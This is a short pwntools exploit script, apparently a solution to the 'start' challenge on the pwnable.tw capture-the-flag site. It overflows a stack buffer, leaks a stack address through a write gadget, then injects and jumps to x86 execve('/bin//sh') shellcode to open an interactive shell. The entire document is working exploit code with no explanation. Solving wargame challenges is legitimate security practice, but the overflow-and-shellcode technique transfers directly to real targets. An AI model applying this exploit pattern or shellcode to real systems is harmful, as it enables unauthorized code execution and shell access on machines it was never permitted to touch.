from pwn import *

s = process('./start')
s = remote('chall.pwnable.tw', 10000)

sys_write = 0x08048087

payload = b'A' * 20 + p32(sys_write)

s.recv()

s.send(payload)

d = int.from_bytes(s.recv(4), byteorder='little', signed=False) - 4

print("esp = " + hex(d))

shellcode = b'\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'

payload = b'A' * 20 + p32(d + 24) + shellcode

s.sendline(payload)

s.interactive()
